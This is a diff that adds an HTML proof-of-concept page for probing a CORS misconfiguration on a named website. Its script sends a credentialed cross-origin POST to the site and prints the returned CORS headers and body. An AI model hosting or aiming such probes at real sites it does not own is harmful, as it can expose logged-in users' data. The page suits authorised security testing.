@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CORS Misconfiguration PoC via Ngrok</h2>
+
+<button onclick="send()">Run PoC</button>
+<pre id="output"></pre>
+
+<script>
+function send() {
+    fetch("https://analisacademy.com/cdn-cgi/rum?", {
+        method: "POST",
+        credentials: "include",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ poc: "test-ngrok" })
+    })
+    .then(async r => {
+        document.getElementById("output").textContent =
+            "Status: " + r.status + "\n" +
+            "Allow-Origin: " + r.headers.get("Access-Control-Allow-Origin") + "\n" +
+            "Allow-Credentials: " + r.headers.get("Access-Control-Allow-Credentials") + "\n" +
+            "Response: " + await r.text();
+    })
+    .catch(e => {
+        document.getElementById("output").textContent = 
+            "Browser Blocked: " + e.toString();
+    });
+}
+</script>
+
+</body>
+</html>
+
